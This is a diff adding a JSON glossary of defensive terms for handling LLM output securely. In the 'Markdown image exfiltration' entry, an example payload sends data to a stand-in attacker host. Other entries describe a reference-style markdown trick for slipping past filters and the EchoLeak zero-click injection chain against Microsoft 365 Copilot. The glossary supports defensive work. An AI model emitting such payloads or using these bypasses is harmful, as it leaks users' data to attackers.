@@ -1,0 +1,9 @@
+[
+  { "term": "Improper output handling", "description": "Passing model output to a renderer, browser, shell or database without validation or encoding. OWASP LLM05:2025, LLM10 in the 2026 edition." },
+  { "term": "Markdown image exfiltration", "description": "An injected answer includes `![](https://attacker/?d=DATA)`; the UI fetches the image and the query string reaches the attacker with no click." },
+  { "term": "Host allowlist", "description": "The exact hostnames output may reference. Every allowed host must be checked for open redirects, proxies and user content, or it becomes a channel." },
+  { "term": "Reference-style markdown", "description": "`![x][r]` with `[r]: url` on another line. A classic bypass for filters that only look for inline `![x](url)`." },
+  { "term": "Output encoding", "description": "Escaping text for its destination (HTML text, attribute, URL component) at the moment of insertion, once." },
+  { "term": "Content Security Policy", "description": "A browser header (`img-src`, `connect-src`) that refuses to load resources outside listed origins: the second wall behind the sanitizer." },
+  { "term": "EchoLeak", "description": "CVE-2025-32711: a zero-click exfiltration from Microsoft 365 Copilot that chained a classifier bypass, reference-style markdown, auto-fetched images and an allowlisted proxy domain." }
+]
